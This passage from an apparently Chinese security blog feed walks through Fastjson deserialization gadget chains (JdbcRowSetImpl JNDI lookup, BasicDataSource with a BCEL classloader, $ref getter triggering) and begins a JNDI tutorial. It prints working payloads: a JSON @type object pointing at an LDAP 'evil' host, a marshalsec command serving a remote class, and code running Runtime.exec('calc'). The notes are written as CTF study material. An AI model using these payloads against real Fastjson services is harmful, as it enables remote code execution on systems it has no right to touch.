java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAutoCommit</span><span class="hljs-params">(<span class="hljs-type">boolean</span> var1)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.conn != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-built_in">this</span>.conn.setAutoCommit(var1);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">this</span>.conn = <span class="hljs-built_in">this</span>.connect();<br><span class="hljs-built_in">this</span>.conn = setAutoCommit(var1);<br>&#125;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>å½“<code>conn == null</code>æ—¶ï¼Œè°ƒç”¨<code>connect()</code>:</p><p><img src="/2024/08/01/fastjson/image-20240801215837593.png" alt="image-20240801215837593"></p><p>ç»å…¸çš„<code>(new InitialContext()).lookup()</code>ï¼Œé‚£ä¹ˆåªè¦dataSourceNameè®¾ä¸ºæ¶æ„è¿œç¨‹RMIæœåŠ¡æˆ–ldapæœåŠ¡å³å¯ã€‚</p><blockquote><p>{</p><p> â€œ@typeâ€:â€com.sun.rowset.JdbcRowSetImplâ€,</p><p> â€œdataSourceNameâ€:â€ldap:&#x2F;&#x2F;127.0.0.1:8099&#x2F;evilâ€,</p><p> â€œautoCommitâ€:true</p><p>}</p></blockquote><p>å¯ä»¥åˆ©ç”¨marshalsecå¼€å¯ldapæœåŠ¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">java -cp .\marshalsec-<span class="hljs-number">0.0</span><span class="hljs-number">.3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http:<span class="hljs-comment">//127.0.0.1:8000/#calc 8099</span><br></code></pre></td></tr></table></figure><p><img src="/2024/08/01/fastjson/image-20240801220859119.png" alt="image-20240801220859119"></p><h3 id="BasicDataSource"><a href="#BasicDataSource" class="headerlink" title="BasicDataSource"></a>BasicDataSource</h3><p>fastjsonç½‘ä¼ çš„ä¸‰æ¡åˆ©ç”¨é“¾å¦‚ä¸‹ï¼š</p><ul><li><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></li><li><code>com.sun.rowset.JdbcRowSetImpl</code></li><li><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></li></ul><p>å‰é¢ä¸¤ä¸ªå·²ç»ä»‹ç»ï¼Œç°åœ¨è¿˜å‰©æœ€åä¸€ä¸ª<code>BasicDataSource</code>ã€‚</p><ol><li>å¸¸è§„çš„Javaå­—èŠ‚ç çš„æ‰§è¡Œï¼Œä½†æ˜¯éœ€è¦å¼€å¯<code>Feature.SupportNonPublicField</code>ï¼Œè¾ƒé¸¡è‚‹</li><li>åˆ©ç”¨JNDIæ³¨å…¥ï¼Œä½†éœ€è¦æœåŠ¡å™¨å‡ºç½‘</li><li>ä¸ç”¨å‡ºç½‘ä¹Ÿä¸ç”¨å¼€å¯<code>Feature.SupportNonPublicField</code></li><li>ä¾èµ–å¦‚ä¸‹</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-dbcp<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.45<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.23<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è°ƒç”¨é“¾ï¼š</strong></p><p><code>getConnection()-&gt;createDataSource()-&gt;createConnectionFactory()-&gt;createDriver()</code></p><p><img src="/2024/08/01/fastjson/image-20240801222516262.png" alt="image-20240801222516262"></p><p><code>Class.forName</code>ç¬¬äºŒä¸ªå‚æ•°<code>initial</code>ä¸ºtrueæ—¶ï¼Œç±»åŠ è½½åå°†ä¼šç›´æ¥æ‰§è¡Œ<code>static&#123;&#125;</code>å—ä¸­çš„ä»£ç ã€‚</p><p><code>driverClassLoader</code>å’Œ<code>driverClassName</code>éƒ½å¯ä»¥é€šè¿‡fastjsonæ§åˆ¶</p><blockquote><p>{</p><p> {</p><p> â€œaaaâ€: {</p><p> â€œ@typeâ€: â€œorg.apache.tomcat.dbcp.dbcp2.BasicDataSourceâ€,</p><p> â€œdriverClassLoaderâ€: {</p><p> â€œ@typeâ€: â€œcom.sun.org.apache.bcel.internal.util.ClassLoaderâ€</p><p> },</p><p> â€œdriverClassNameâ€: â€œ$$BCEL$$$l$8b$I$A$â€¦â€</p><p> }</p><p> }: â€œbbbâ€</p><p>}</p></blockquote><p><img src="/2024/08/01/fastjson/image-20240801222607739.png" alt="image-20240801222607739"></p><p>å®é™…ä¸Šé¢çš„getConnectionä¸æ»¡è¶³fastjsonå¯¹è‡ªåŠ¨è°ƒç”¨getterçš„è¦æ±‚ï¼Œå‰é¢è¯´è¿‡ï¼š</p><blockquote><p>æ»¡è¶³æ¡ä»¶çš„getterï¼š</p><ul><li>å‡½æ•°åé•¿åº¦å¤§äºç­‰äº4</li><li>éé™æ€æ–¹æ³•</li><li>ä»¥getå¼€å¤´ä¸”ç¬¬4ä¸ªå­—æ¯ä¸ºå¤§å†™</li><li>æ— å‚æ•°</li><li>è¿”å›å€¼ç±»å‹ç»§æ‰¿è‡ªCollectionæˆ–Mapæˆ–AtomicBooleanæˆ–AtomicInteger</li></ul></blockquote><p>åœ¨<code>&#123;&quot;@type&quot;:&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;â€¦â€¦&#125;</code> è¿™ä¸€æ•´æ®µå¤–é¢å†å¥—ä¸€å±‚<code>&#123;&#125;</code>ï¼Œè¿™æ ·çš„è¯ä¼šæŠŠè¿™ä¸ªæ•´ä½“å½“åšä¸€ä¸ªJSONObjectï¼Œä¼šæŠŠè¿™ä¸ªå½“åškeyï¼Œå€¼ä¸ºbbb</p><p>å°†è¿™ä¸ª JSONObject æ”¾åœ¨ JSON Key çš„ä½ç½®ä¸Šï¼Œåœ¨ JSON ååºåˆ—åŒ–çš„æ—¶å€™ï¼ŒFastJson ä¼šå¯¹ JSON Key è‡ªåŠ¨è°ƒç”¨ toString() æ–¹æ³•ï¼ˆå› ä¸ºkeyä¸€å®šè¦æ˜¯Stringç±»å‹ï¼‰</p><p>è€Œä¸”JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œå½“è°ƒç”¨<code>toString</code>çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteræ–¹æ³•è·å–å€¼ã€‚æ‰€ä»¥ä¼šè°ƒç”¨åˆ°<code>getConnection</code>æ–¹æ³•ã€‚</p><p><img src="/2024/08/01/fastjson/image-20240801222706621.png" alt="image-20240801222706621"></p><p>å½“fastjson&gt;&#x3D;1.2.36çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨<code>$ref</code>æ–¹å¼è°ƒç”¨getterã€‚</p><p>refæ˜¯fastjsonç‰¹æœ‰çš„JSONPathè¯­æ³•ï¼Œç”¨æ¥å¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br>    <span class="hljs-keyword">private</span> String cmd;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setCmd</span><span class="hljs-params">(String cmd)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;seter call&quot;</span>);<br>        <span class="hljs-built_in">this</span>.cmd = cmd;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCmd</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        System.out.println(<span class="hljs-string">&quot;geter call&quot;</span>);<br>        Runtime.getRuntime().exec(cmd);<br>        <span class="hljs-keyword">return</span> cmd;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ref_fastjson.java:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ref_fastjson</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;[&#123;\&quot;@type\&quot;:\&quot;com.demo.fastjson.test\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[0].cmd\&quot;&#125;]&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="åŸç”Ÿååºåˆ—åŒ–"><a href="#åŸç”Ÿååºåˆ—åŒ–" class="headerlink" title="åŸç”Ÿååºåˆ—åŒ–"></a>åŸç”Ÿååºåˆ—åŒ–</h3><p>æ¥è‡ªY4ä½¬ï¼š</p><p><a href="https://paper.seebug.org/2055/">FastJson ä¸åŸç”Ÿååºåˆ—åŒ– (seebug.org)</a></p><p><a href="https://y4tacker.github.io/2023/04/26/year/2023/4/FastJson%E4%B8%8E%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%BA%8C/">FastJsonä¸åŸç”Ÿååºåˆ—åŒ–(äºŒ) (y4tacker.github.io)</a></p><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä¸ƒä¸ƒå…«å…«æŠ„äº†ä¸€äº›ï¼Œæ‰“æ¯”èµ›çš„æ—¶å€™é‡åˆ°fastjsonä¹ŸæŒºå¤šçš„ï¼Œå¤šå­¦ä¹ å­¦ä¹ ã€‚ä½†fastjsonä¹Ÿé€æ¸æ·¡å‡ºè§†é‡äº†ã€‚</p><p>ç°åœ¨java8çš„é¢˜å°†è¦æ­»å»ï¼Œå‡ºç°æ›´å¤šçš„java11ã€java17ï¼Œè¿™éƒ½æ˜¯æ–°çš„æŒ‘æˆ˜ï¼Œå› ä¸ºæ¶‰åŠåˆ°å…¨æ–°çš„æ€è·¯ä¸æ–¹æ³•ã€‚</p><p>ç°åœ¨æˆ‘åªä¸è¿‡æ˜¯æ²¿ç€å‰äººçš„é“è·¯ä¸€æ­¥æ­¥ç­‘åŸºç½¢äº†ã€‚</p><p>Jacksonè·Ÿfastjsonå¾ˆåƒï¼Œæ”¾åœ¨åé¢å†™ã€‚</p><p>ä»¥åŠæœ€åé™„ä¸Šsu18å¤§ä½¬çš„ï¼Œå¸¸çœ‹å¸¸æ–°ï¼š</p><p><a href="https://su18.org/post/fastjson/#%E4%B8%80-%E7%AE%80%E4%BB%8B">fastjsonï¼šæˆ‘ä¸€è·¯å‘åŒ—ï¼Œç¦»å¼€æœ‰ä½ çš„å­£èŠ‚ | ç´ åå…« (su18.org)</a></p><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/fastjson">FastJson ğŸª | Java (gitbook.io)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JNDI</title>
    <link href="/2024/07/30/JNDI/"/>
    <url>/2024/07/30/JNDI/</url>
    
    <content type="html"><![CDATA[<p>JNDIå®ƒç»ˆäºæ¥äº†ã€‚</p><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>é¦–å…ˆä»‹ç»ä¸€ä¸‹ä»€ä¹ˆæ˜¯JNDIã€‚</p><p>JNDI(<code>Java Naming and Directory Interface</code>)ï¼šJavaå‘½åä¸ç›®å½•æ¥å£</p><p>æ ‡å‡†çš„Javaå‘½åç³»ç»Ÿæ¥å£ï¼ŒJNDIæä¾›ç»Ÿä¸€çš„å®¢æˆ·ç«¯APIï¼Œé€šè¿‡ä¸åŒçš„è®¿é—®æä¾›è€…æ¥å£JNDIæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰çš„å®ç°ï¼Œç”±ç®¡ç†è€…å°†JNDI APIæ˜ å°„ä¸ºç‰¹å®šçš„å‘½åæœåŠ¡å’Œç›®å½•ç³»ç»Ÿï¼Œä½¿Javaåº”ç”¨ç¨‹åºèƒ½å’Œè¿™äº›å‘½åæœåŠ¡å’Œç›®å½•æœåŠ¡ä¹‹é—´è¿›è¡Œäº¤äº’ã€‚</p><p>ç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„ä¸€ç§è‡ªç„¶æ‰©å±•ã€‚</p><p><strong>Naming Service å‘½åæœåŠ¡ï¼š</strong> æŠŠä¸€ä¸ªæœåŠ¡åç§°å’Œå¯¹è±¡æˆ–å‘½åå¼•ç”¨ç›¸å…³è”ã€‚åœ¨ä¸€äº›å‘½åæœåŠ¡ç³»ç»Ÿä¸­å¹¶ä¸ç›´æ¥å°†å¯¹è±¡è¿›è¡Œå­˜å‚¨ï¼Œè€Œæ˜¯å­˜å‚¨äº†å¯¹è±¡çš„å¼•ç”¨ï¼Œå¼•ç”¨åŒ…å«äº†å¦‚ä½•è®¿é—®å®é™…å¯¹è±¡çš„ä¿¡æ¯ï¼Œç±»ä¼¼äºæŒ‡é’ˆã€‚</p><ul><li><strong>Bindings</strong>: è¡¨ç¤ºä¸€ä¸ªåç§°å’Œå¯¹åº”å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­æ–‡ä»¶åç»‘å®šåˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œåœ¨ DNS ä¸­åŸŸåç»‘å®šåˆ°å¯¹åº”çš„ IPã€‚</li><li><strong>Context</strong>: ä¸Šä¸‹æ–‡ï¼Œä¸€ä¸ªä¸Šä¸‹æ–‡ä¸­å¯¹åº”ç€ä¸€ç»„åç§°åˆ°å¯¹è±¡çš„ç»‘å®šå…³ç³»ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æŒ‡å®šä¸Šä¸‹æ–‡ä¸­æŸ¥æ‰¾åç§°å¯¹åº”çš„å¯¹è±¡ã€‚æ¯”å¦‚åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªç›®å½•å°±æ˜¯ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼Œå¯ä»¥åœ¨è¯¥ç›®å½•ä¸­æŸ¥æ‰¾æ–‡ä»¶ï¼Œå…¶ä¸­å­ç›®å½•ä¹Ÿå¯ä»¥ç§°ä¸ºå­ä¸Šä¸‹æ–‡ (<code>subcontext</code>)ã€‚</li><li><strong>References</strong>: å½“å­˜åœ¨ä¸Šè¿°çš„ç‰¹æ®Šæƒ…å†µæ—¶ï¼Œä»¥å¼•ç”¨çš„å½¢å¼è¿›è¡Œå­˜å‚¨ï¼Œå¯ä»¥ç†è§£ä¸ºæŒ‡é’ˆã€‚å¼•ç”¨ä¸­åŒ…å«äº†è·å–å®é™…å¯¹è±¡æ‰€éœ€çš„ä¿¡æ¯ï¼Œç”šè‡³å¯¹è±¡çš„å®é™…çŠ¶æ€ã€‚æ¯”å¦‚æ–‡ä»¶ç³»ç»Ÿä¸­å®é™…æ ¹æ®åç§°æ‰“å¼€çš„æ–‡ä»¶æ˜¯ä¸€ä¸ªæ•´æ•° fd ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªå¼•ç”¨ï¼Œå†…æ ¸æ ¹æ®è¿™ä¸ªå¼•ç”¨å€¼å»æ‰¾åˆ°ç£ç›˜ä¸­çš„å¯¹åº”ä½ç½®å’Œè¯»å†™åç§»ã€‚</li></ul><p><strong>Directory Service ç›®å½•æœåŠ¡ï¼š</strong> åœ¨å‘½ååŸºç¡€ä¸Šå¢åŠ äº†å±æ€§ï¼ˆæ–‡ä»¶ç›®å½•ä¸­æ¯ä¸ªæ–‡ä»¶å’Œç›®å½•éƒ½æœ‰å±æ€§ï¼šå¦‚åˆ›å»ºæ—¶é—´ã€è¯»å†™æ‰§è¡Œæƒé™ï¼‰ä¸ä»…å¯ä»¥æ ¹æ®åç§°å»æŸ¥æ‰¾(<strong>lookup</strong>)å¯¹è±¡(å¹¶è·å–å…¶å¯¹åº”å±æ€§)ï¼Œè¿˜å¯ä»¥æ ¹æ®å±æ€§å€¼å»æœç´¢(<strong>search</strong>)å¯¹è±¡ã€‚</p><p>åº”ç”¨é€šè¿‡JNDIä¸å…·ä½“çš„ç›®å½•æœåŠ¡è¿›è¡Œäº¤äº’ã€‚ä»è®¾è®¡ä¸Šï¼ŒJNDI ç‹¬ç«‹äºå…·ä½“çš„ç›®å½•æœåŠ¡å®ç°ï¼Œè®¾è®¡å‡ºäº†åº”ç”¨èŒƒå›´å®½æ³›çš„(ä¹Ÿå°±æ˜¯å…¼å®¹æ€§æ¯”è¾ƒå¼ºå¤§)ï¼Œå› æ­¤å¯ä»¥é’ˆå¯¹ä¸åŒçš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€çš„æ“ä½œæ¥å£ã€‚</p><p><img src="/2024/07/30/JNDI/image-20240730190919769.png" alt="image-20240730190919769"></p><p>SPI å…¨ç§°ä¸º Service Provider Interfaceï¼Œå³æœåŠ¡ä¾›åº”æ¥å£ï¼Œä¸»è¦ä½œç”¨æ˜¯<strong>ä¸ºåº•å±‚çš„å…·ä½“çš„ç›®å½•æœåŠ¡æä¾›ç»Ÿä¸€æ¥å£</strong>ï¼Œä»è€Œå®ç°ç›®å½•æœåŠ¡çš„å¯æ’æ‹”å¼å®‰è£…ã€‚åœ¨ JDK ä¸­åŒ…å«äº†ä¸‹è¿°å†…ç½®çš„ç›®å½•æœåŠ¡:</p><ul><li>RMIï¼šRemote Method Invocation è¿œç¨‹æ–¹æ³•è°ƒç”¨</li><li>LDAPï¼šLightweight Directory Access Protocol è½»é‡çº§ç›®å½•è®¿é—®åè®®</li><li>CORBAï¼šCommon Object Request Broker Architecture é€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†æ¶æ„</li></ul><p>åœ¨ Java JDK é‡Œé¢æä¾›äº†5ä¸ªåŒ…ï¼Œæä¾›ç»™JNDIçš„åŠŸèƒ½å®ç°ï¼Œåˆ†åˆ«æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Â·javax.namingï¼šä¸»è¦ç”¨äºå‘½åæ“ä½œ,åŒ…å«äº†è®¿é—®ç›®å½•æœåŠ¡æ‰€éœ€çš„ç±»å’Œæ¥å£ï¼Œæ¯”å¦‚ Contextã€Bindingsã€Referencesã€lookup ç­‰ã€‚<br><br>Â·javax.naming.directoryï¼šä¸»è¦ç”¨äºç›®å½•æ“ä½œï¼Œå®ƒå®šä¹‰äº†DirContextæ¥å£å’ŒInitialDir- Contextç±»ï¼›<br><br>Â·javax.naming.eventï¼šåœ¨å‘½åç›®å½•æœåŠ¡å™¨ä¸­è¯·æ±‚äº‹ä»¶é€šçŸ¥ï¼›<br><br>Â·javax.naming.ldapï¼šæä¾›LDAPæ”¯æŒï¼›<br><br>Â·javax.naming.spiï¼šå…è®¸åŠ¨æ€æ’å…¥ä¸åŒå®ç°ï¼Œä¸ºä¸åŒå‘½åç›®å½•æœåŠ¡ä¾›åº”å•†çš„å¼€å‘äººå‘˜æä¾›å¼€å‘å’Œå®ç°çš„é€”å¾„ï¼Œä»¥ä¾¿åº”ç”¨ç¨‹åºé€šè¿‡JNDIå¯ä»¥è®¿é—®ç›¸å…³æœåŠ¡ã€‚<br></code></pre></td></tr></table></figure><h2 id="å…±æœ‰ç±»Common-Class"><a href="#å…±æœ‰ç±»Common-Class" class="headerlink" title="å…±æœ‰ç±»Common Class"></a>å…±æœ‰ç±»Common Class</h2><h3 id="InitialContextç±»"><a href="#InitialContextç±»" class="headerlink" title="InitialContextç±»:"></a><code>InitialContext</code>ç±»:</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">InitialContext() æ„å»ºä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ã€‚ <br><br>InitialContext(<span class="hljs-type">boolean</span> lazy) æ„é€ ä¸€ä¸ªåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå¹¶é€‰æ‹©ä¸åˆå§‹åŒ–å®ƒã€‚ <br><br>InitialContext(Hashtable environment) ä½¿ç”¨æä¾›çš„ç¯å¢ƒæ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ã€‚<br></code></pre></td></tr></table></figure><p>æ„å»ºåˆå§‹ä¸Šä¸‹æ–‡ï¼Œå°±æ˜¯è·å–åˆå§‹ç›®å½•ç¯å¢ƒã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">bind(Name name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ã€‚ <br>list(String name) æšä¸¾åœ¨å‘½åä¸Šä¸‹æ–‡ä¸­ç»‘å®šçš„åç§°ä»¥åŠç»‘å®šåˆ°å®ƒä»¬çš„å¯¹è±¡çš„ç±»åã€‚ <br>lookup(String name) æ£€ç´¢å‘½åå¯¹è±¡ã€‚ <br>rebind(String name, Object obj) å°†åç§°ç»‘å®šåˆ°å¯¹è±¡ï¼Œè¦†ç›–ä»»ä½•ç°æœ‰ç»‘å®šã€‚ <br>unbind(String name) å–æ¶ˆç»‘å®šå‘½åå¯¹è±¡ã€‚<br></code></pre></td></tr></table></figure><h3 id="Referencesç±»ï¼š"><a href="#Referencesç±»ï¼š" class="headerlink" title="Referencesç±»ï¼š"></a><code>References</code>ç±»ï¼š</h3><p>åœ¨å‘½å&#x2F;ç›®å½•ç³»ç»Ÿå¤–éƒ¨æ‰¾åˆ°çš„å¯¹è±¡çš„å¼•ç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">Reference(String className)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡æ„é€ ä¸€ä¸ªæ–°çš„å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡å’Œåœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, RefAddr addr, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ï¼Œå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®ä»¥åŠå¯¹è±¡çš„åœ°å€æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br>Reference(String className, String factory, String factoryLocation)<br>ä¸ºç±»åä¸ºâ€œclassNameâ€çš„å¯¹è±¡ä»¥åŠå¯¹è±¡å·¥å‚çš„ç±»åå’Œä½ç½®æ„é€ ä¸€ä¸ªæ–°å¼•ç”¨ã€‚<br><br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">int</span> posn, RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°ç´¢å¼•posnçš„åœ°å€åˆ—è¡¨ä¸­ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(RefAddr addr)</span> å°†åœ°å€æ·»åŠ åˆ°åœ°å€åˆ—è¡¨çš„æœ«å°¾ã€‚<br><span class="hljs-keyword">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">()</span> ä»æ­¤å¼•ç”¨ä¸­åˆ é™¤æ‰€æœ‰åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> æ£€ç´¢ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br>RefAddr <span class="hljs-title function_">get</span><span class="hljs-params">(String addrType)</span> æ£€ç´¢åœ°å€ç±»å‹ä¸ºâ€œaddrTypeâ€çš„ç¬¬ä¸€ä¸ªåœ°å€ã€‚<br>Enumeration <span class="hljs-title function_">getAll</span><span class="hljs-params">()</span> æ£€ç´¢æœ¬å‚è€ƒæ–‡çŒ®ä¸­åœ°å€çš„åˆ—ä¸¾ã€‚<br>String <span class="hljs-title function_">getClassName</span><span class="hljs-params">()</span> æ£€ç´¢å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„ç±»åã€‚<br>String <span class="hljs-title function_">getFactoryClassLocation</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨çš„å¯¹è±¡çš„å·¥å‚ä½ç½®ã€‚<br>String <span class="hljs-title function_">getFactoryClassName</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨å¼•ç”¨å¯¹è±¡çš„å·¥å‚çš„ç±»åã€‚<br>Object <span class="hljs-title function_">remove</span><span class="hljs-params">(<span class="hljs-type">int</span> posn)</span> ä»åœ°å€åˆ—è¡¨ä¸­åˆ é™¤ç´¢å¼•posnä¸Šçš„åœ°å€ã€‚<br><span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> æ£€ç´¢æ­¤å¼•ç”¨ä¸­çš„åœ°å€æ•°ã€‚<br>String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> ç”Ÿæˆæ­¤å¼•ç”¨çš„å­—ç¬¦ä¸²è¡¨ç¤ºå½¢å¼ã€‚<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;<br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> 